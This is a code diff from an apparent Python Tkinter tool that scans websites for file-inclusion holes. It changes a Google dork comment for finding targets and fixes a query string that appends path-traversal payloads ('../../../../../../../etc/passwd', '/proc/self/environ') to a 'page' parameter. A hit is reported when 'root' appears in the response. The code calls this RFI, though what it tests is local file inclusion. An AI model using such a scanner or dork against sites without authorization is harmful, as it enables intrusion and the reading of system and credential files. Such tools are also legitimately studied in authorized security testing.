@@ -2,7 +2,7 @@ import requests
 import tkinter as tk
 from tkinter import ttk
 
-#dork para scan: inurl:index.php?file= site:
+#dork para scan: inurl:"index.php?page="
 
 #definindo os botoes
 def run_scan():
@@ -14,7 +14,7 @@ def run_scan():
     files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]
    
     for file in files:
-        rfi_url = url + "?page" + file
+        rfi_url = url + "?page=" + file
         response = requests.get(rfi_url)
         if "root" in response.text:
             result_label.config(text=result_label.cget("text") + f"[+] is vulnerable to RFI: {rfi_url}\n")
